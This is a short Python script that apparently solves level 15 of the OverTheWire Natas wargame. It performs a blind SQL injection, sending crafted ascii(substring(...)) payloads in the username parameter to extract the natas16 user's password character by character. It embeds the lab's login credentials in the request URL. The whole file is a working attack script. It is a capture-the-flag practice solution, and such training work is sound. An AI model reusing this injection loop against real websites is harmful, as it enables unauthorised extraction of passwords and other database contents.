import requests

character = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password = ''
i = 0
while len(password)<32:
	i = i + 1
	print len(password)
	for p in character:
		blindstring = '" or ascii(substring((SELECT password from users where username="natas16"),'+str(i)+',1))=ascii("'+ p +'")-- -'
		r = requests.get('http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/?username='+blindstring)
		if "This user exists" in r.text:
			password += p
			print password
			break 